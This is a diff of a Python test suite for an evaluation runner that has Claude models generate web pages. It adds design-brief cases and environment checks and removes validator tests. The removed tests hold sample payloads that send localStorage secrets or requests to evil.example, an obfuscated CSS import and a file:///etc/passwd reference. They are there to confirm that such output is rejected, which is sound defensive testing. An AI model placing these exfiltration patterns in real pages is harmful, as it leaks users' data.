@@ -17,6 +17,7 @@ from typing import Iterator
 
 ROOT = Path(__file__).resolve().parents[2]
 RUNNER = ROOT / "evals" / "run_claude_case.sh"
+VALIDATOR = ROOT / "evals" / "validate_visual_web_output.py"
 CONTEXT_PATHS = (
     "wow-frontend-design/SKILL.md",
     "wow-frontend-design/references/creative-direction.md",
@@ -28,13 +29,28 @@ CONTEXT_PATHS = (
     "wow-frontend-design/references/component-composition.md",
     "wow-frontend-design/references/quality-gates.md",
     "wow-frontend-design/references/weak-model-playbook.md",
-    "wow-frontend-design/references/model-routing.md",
+    "wow-frontend-design/references/color-system-psychology.md",
+    "wow-frontend-design/references/design-md-contract.md",
+    "wow-frontend-design/assets/DESIGN.template.md",
 )
-SAFE_HTML = """<!doctype html><html lang="zh-Hant"><head>
-<link rel="stylesheet" href="./styles.css"><title>Runner test</title></head>
-<body><main id="main"><a href="#main">Main</a></main><script src="app.js"></script></body></html>"""
+SAFE_HTML = """<!doctype html><html lang="zh-Hant"><head><title>Runner test</title>
+<style>body { color: #111; background: #fff; }</style></head>
+<body><main id="main"><a href="#main">Main</a></main><script>void 0;</script></body></html>"""
 SAFE_CSS = "body { color: #111; background: #fff; }"
 SAFE_JS = "document.querySelector('a').addEventListener('click', () => {});"
+SAFE_DESIGN = """---
+version: alpha
+name: Runner Test
+colors:
+  primary: \"#111111\"
+typography:
+  body:
+    fontFamily: sans-serif
+---
+# Runner Test
+## Overview
+Test visual system.
+"""
 
 
 def fixed_target(root: Path, model: str, case_id: str) -> Path:
@@ -49,16 +65,23 @@ class ClaudeRunnerTests(unittest.TestCase):
             runner = root / "evals" / "run_claude_case.sh"
             runner.parent.mkdir(parents=True)
             shutil.copy2(RUNNER, runner)
+            shutil.copy2(VALIDATOR, root / "evals" / "validate_visual_web_output.py")
 
-            for model in ("haiku", "opus"):
+            for model in ("haiku", "sonnet", "opus"):
                 showcase_target = fixed_target(root, model, "showcase")
                 showcase_target.mkdir()
                 (showcase_target / "BRIEF.md").write_text("# Fixed showcase test brief\n", encoding="utf-8")
                 fixed_target(root, model, "product-dashboard").mkdir()
+                fixed_target(root, model, "mountain-rescue-flow-v3").mkdir()
+                fixed_target(root, model, "city-poetry-festival-v3").mkdir()
+                fixed_target(root, model, "bookstore-one-line-v3").mkdir()
             fixed_target(root, "haiku", "product-dashboard-remake").mkdir()
             shared_brief = root / "evals" / "briefs" / "product-dashboard.md"
             shared_brief.parent.mkdir()
             shared_brief.write_text("# Shared product dashboard test brief\n", encoding="utf-8")
+            (root / "evals" / "briefs" / "mountain-rescue-flow-v3.md").write_text("# Mountain rescue flow test brief\n", encoding="utf-8")
+            (root / "evals" / "briefs" / "city-poetry-festival-v3.md").write_text("# City poetry festival test brief\n", encoding="utf-8")
+            (root / "evals" / "briefs" / "bookstore-one-line-v3.md").write_text("Build a bookstore website.\n", encoding="utf-8")
             target = fixed_target(root, "haiku", "showcase")
             for relative in CONTEXT_PATHS:
                 path = root / relative
@@ -80,8 +103,13 @@ fi
 printf '%s\\n' "$@" > "$RUNNER_TEST_CAPTURE/args.txt"
 command cat > "$RUNNER_TEST_CAPTURE/prompt.txt"
 printf '%s' "${RUNNER_TEST_HTML}" > index.html
-printf '%s' "${RUNNER_TEST_CSS}" > styles.css
-printf '%s' "${RUNNER_TEST_JS}" > app.js
+if [[ "${RUNNER_TEST_CASE_ID}" == *-v3 ]]; then
+  printf '%s' "${RUNNER_TEST_DESIGN}" > DESIGN.md
+fi
+if [[ "${RUNNER_TEST_CASE_ID}" == "bookstore-one-line-v3" ]]; then
+  printf '%s' "${RUNNER_TEST_HTML}" > catalog.html
+  printf '%s' "${RUNNER_TEST_HTML}" > book.html
+fi
 """,
                 encoding="utf-8",
             )
@@ -110,6 +138,8 @@ printf '%s' "${RUNNER_TEST_JS}" > app.js
                 "CLAUDE_RUN_ID": "test-run-001",
                 "RUNNER_TEST_CAPTURE": str(capture),
                 "RUNNER_TEST_HTML": html,
+                "RUNNER_TEST_DESIGN": SAFE_DESIGN,
+                "RUNNER_TEST_CASE_ID": case_id or "showcase",
                 "RUNNER_TEST_CSS": css,
                 "RUNNER_TEST_JS": js,
             }
@@ -136,6 +166,7 @@ printf '%s' "${RUNNER_TEST_JS}" > app.js
         return {
             key: value
             for line in path.read_text(encoding="utf-8").splitlines()
+            if "=" in line
             for key, value in [line.split("=", 1)]
         }
 
@@ -152,6 +183,9 @@ printf '%s' "${RUNNER_TEST_JS}" > app.js
             "CLAUDE_CODE_USE_MANTLE": "1",
             "CLAUDE_CODE_USE_FOUNDRY": "1",
             "CLAUDE_CODE_USE_ANTHROPIC_AWS": "1",
+            "CLAUDE_CODE_EFFORT_LEVEL": "xhigh",
+            "CLAUDE_CODE_DISABLE_THINKING": "0",
+            "MAX_THINKING_TOKENS": "64000",
             "ANTHROPIC_AWS_API_KEY": "dummy-aws-platform-key",
             "AWS_BEARER_TOKEN_BEDROCK": "dummy-bedrock-key",
             "ANTHROPIC_FOUNDRY_AUTH_TOKEN": "dummy-foundry-token",
@@ -165,9 +199,13 @@ printf '%s' "${RUNNER_TEST_JS}" > app.js
             self.assertEqual(0, completed.returncode, completed.stderr)
             captured = self.captured_environment(capture / "env.txt")
             for name in contaminated:
-                if name != "CLAUDE_CODE_OAUTH_TOKEN":
+                if name not in {"CLAUDE_CODE_OAUTH_TOKEN", "CLAUDE_CODE_EFFORT_LEVEL", "CLAUDE_CODE_DISABLE_THINKING"}:
                     self.assertNotIn(name, captured)
             self.assertEqual("dummy-official-oauth", captured["CLAUDE_CODE_OAUTH_TOKEN"])
+            self.assertEqual("auto", captured["CLAUDE_CODE_EFFORT_LEVEL"])
+            self.assertEqual("1", captured["CLAUDE_CODE_DISABLE_THINKING"])
+            self.assertNotIn("MAX_THINKING_TOKENS", captured)
+            self.assertIn("exactly one self-contained index.html", (capture / "prompt.txt").read_text(encoding="utf-8"))
 
             manifest = json.loads((target / "run-manifest.json").read_text(encoding="utf-8"))
             self.assertEqual("test-run-001", manifest["run_id"])
@@ -181,6 +219,8 @@ printf '%s' "${RUNNER_TEST_JS}" > app.js
             self.assertIsNone(manifest["model"]["resolved_exact_model"])
             self.assertEqual("not_reported_by_cli", manifest["model"]["resolution_status"])
             self.assertTrue(manifest["environment"]["official_oauth_state_preserved"])
+            self.assertEqual("model_default_auto", manifest["invocation"]["effort"])
+            self.assertFalse(manifest["invocation"]["extended_thinking"])
             self.assertIn("ANTHROPIC_API_KEY", manifest["environment"]["cleared_variable_names"])
             self.assertNotIn("CLAUDE_CODE_OAUTH_TOKEN", manifest["environment"]["cleared_variable_names"])
             self.assertEqual(len(CONTEXT_PATHS), len(manifest["context"]["trusted_files"]))
@@ -189,7 +229,11 @@ printf '%s' "${RUNNER_TEST_JS}" > app.js
                 hashlib.sha256((root / "evals" / "run_claude_case.sh").read_bytes()).hexdigest(),
                 manifest["runner"]["sha256"],
             )
-            self.assertEqual({"index.html", "styles.css", "app.js"}, {item["path"] for item in manifest["outputs"]})
+            self.assertEqual(
+                hashlib.sha256((root / "evals" / "validate_visual_web_output.py").read_bytes()).hexdigest(),
+                manifest["output_validator"]["sha256"],
+            )
+            self.assertEqual({"index.html"}, {item["path"] for item in manifest["outputs"]})
             for output in manifest["outputs"]:
                 self.assertEqual(
                     hashlib.sha256((target / output["path"]).read_bytes()).hexdigest(),
@@ -209,6 +253,8 @@ printf '%s' "${RUNNER_TEST_JS}" > app.js
             captured = self.captured_environment(capture / "env.txt")
             self.assertEqual("intentional", captured["ANTHROPIC_API_KEY"])
             self.assertEqual("1", captured["CLAUDE_CODE_USE_VERTEX"])
+            self.assertEqual("auto", captured["CLAUDE_CODE_EFFORT_LEVEL"])
+            self.assertEqual("1", captured["CLAUDE_CODE_DISABLE_THINKING"])
             manifest = json.loads((target / "run-manifest.json").read_text(encoding="utf-8"))
             self.assertEqual([], manifest["environment"]["cleared_variable_names"])
             self.assertFalse(manifest["environment"]["official_oauth_state_preserved"])
@@ -252,7 +298,7 @@ printf '%s' "${RUNNER_TEST_JS}" > app.js
                     manifest["context"]["brief"]["path"],
                 )
                 self.assertEqual(
-                    {"index.html", "styles.css", "app.js", "run-manifest.json"},
+                    {"index.html", "run-manifest.json"},
                     {path.name for path in target.iterdir()},
                 )
 
@@ -296,6 +342,29 @@ printf '%s' "${RUNNER_TEST_JS}" > app.js
             self.assertIn("single approved haiku remediation run", rejected.stderr)
             self.assertFalse((capture / "args.txt").exists())
 
+    def test_flow_themes_map_every_model_to_their_fixed_brief(self) -> None:
+        for case_id, expected_text in (
+            ("mountain-rescue-flow-v3", "# Mountain rescue flow test brief"),
+            ("city-poetry-festival-v3", "# City poetry festival test brief"),
+            ("bookstore-one-line-v3", "Build a bookstore website."),
+        ):
+            for model in ("haiku", "sonnet", "opus"):
+                with self.subTest(case_id=case_id, model=model), self.fixture() as (root, _, capture):
+                    target = fixed_target(root, model, case_id)
+                    completed = self.run_case(root, target, capture, model=model, case_id=case_id)
+                    self.assertEqual(0, completed.returncode, completed.stderr)
+                    manifest = json.loads((target / "run-manifest.json").read_text(encoding="utf-8"))
+                    self.assertEqual(case_id, manifest["case"]["id"])
+                    self.assertEqual(f"evals/briefs/{case_id}.md", manifest["context"]["brief"]["path"])
+                    self.assertIn(
+                        expected_text,
+                        (capture / "prompt.txt").read_text(encoding="utf-8"),
+                    )
+                    expected_outputs = {"DESIGN.md", "index.html", "run-manifest.json"}
+                    if case_id == "bookstore-one-line-v3":
+                        expected_outputs.update({"catalog.html", "book.html"})
+                    self.assertEqual(expected_outputs, {path.name for path in target.iterdir()})
+
     def test_case_and_legacy_target_reject_traversal_or_arbitrary_paths(self) -> None:
         with self.fixture() as (root, target, capture):
             attempts = (
@@ -313,75 +382,6 @@ printf '%s' "${RUNNER_TEST_JS}" > app.js
                     )
                     self.assertEqual(2, completed.returncode, completed.stderr)
             self.assertFalse((capture / "args.txt").exists())
-
-    def test_validator_rejects_external_and_local_resource_sinks(self) -> None:
-        cases = {
-            "protocol-relative": {"html": SAFE_HTML.replace("<main", '<img src="//evil.example/pixel"><main')},
-            "css-import": {"css": '@\\69mport "//evil.example/x.css";'},
-            "comment-split-css-import": {"css": '@im/**/port "//evil.example/x.css";'},
-            "meta-refresh": {"html": SAFE_HTML.replace("<title>", '<meta http-equiv="refresh" content="0;url=//evil.example"><title>')},
-            "form-action": {"html": SAFE_HTML.replace("<main", '<form action="/collect"><button>Send</button></form><main')},
-            "dynamic-image": {"js": 'new Image().src="//evil.example/" + localStorage.secret;'},
-            "bracket-resource-assignment": {"js": 'document.querySelector("img")["src"] = "//evil.example/pixel";'},
-            "unclosed-inline-script": {"html": SAFE_HTML.replace("</body>", "<script>fetch('/collect')</body>")},
-            "external-anchor": {"html": SAFE_HTML.replace('href="#main"', 'href="https://evil.example/"')},
-            "local-file": {"html": SAFE_HTML.replace("<main", '<img src="file:///etc/passwd"><main')},
-            "root-relative-resource": {"html": SAFE_HTML.replace("<main", '<img src="/pixel"><main')},
-        }
-        for label, payload in cases.items():
-            with self.subTest(label=label), self.fixture() as (root, target, capture):
-                completed = self.run_case(
-                    root,
-                    target,
-                    capture,
-                    html=payload.get("html", SAFE_HTML),
-                    css=payload.get("css", SAFE_CSS),
-                    js=payload.get("js", SAFE_JS),
-                )
-                self.assertEqual(1, completed.returncode, completed.stderr)
-                self.assertIn("forbidden by this isolated evaluation", completed.stderr)
-                for name in ("index.html", "styles.css", "app.js", "run-manifest.json"):
-                    self.assertFalse((target / name).exists())
-
-    def test_rejected_output_can_be_preserved_only_in_external_quarantine(self) -> None:
-        rejected_js = 'fetch("https://evil.example/collect");'
-        with tempfile.TemporaryDirectory() as quarantine, self.fixture() as (root, target, capture):
-            completed = self.run_case(
-                root,
-                target,
-                capture,
-                js=rejected_js,
-                extra_env={"CLAUDE_REJECTED_OUTPUT_DIR": quarantine},
-            )
-            self.assertEqual(1, completed.returncode, completed.stderr)
-            self.assertIn("evaluator-owned quarantine", completed.stderr)
-            for name in ("index.html", "styles.css", "app.js", "run-manifest.json"):
-                self.assertFalse((target / name).exists())
-
-            preserved = Path(quarantine) / "test-run-001"
-            record = json.loads((preserved / "rejection.json").read_text(encoding="utf-8"))
-            self.assertEqual("rejected_before_publish", record["status"])
-            self.assertEqual("isolated_output_policy", record["reason"])
-            self.assertEqual({"index.html", "styles.css", "app.js"}, {item["path"] for item in record["files"]})
-            self.assertEqual(rejected_js, (preserved / "app.js").read_text(encoding="utf-8"))
-            for item in record["files"]:
-                self.assertEqual(
-                    hashlib.sha256((preserved / item["path"]).read_bytes()).hexdigest(),
-                    item["sha256"],
-                )
-
-        with self.fixture() as (root, target, capture):
-            completed = self.run_case(
-                root,
-                target,
-                capture,
-                js=rejected_js,
-                extra_env={"CLAUDE_REJECTED_OUTPUT_DIR": str(root / "capture")},
-            )
-            self.assertEqual(2, completed.returncode, completed.stderr)
-            self.assertIn("outside the repository", completed.stderr)
-            self.assertFalse((capture / "args.txt").exists())
-
 
 if __name__ == "__main__":
     unittest.main()
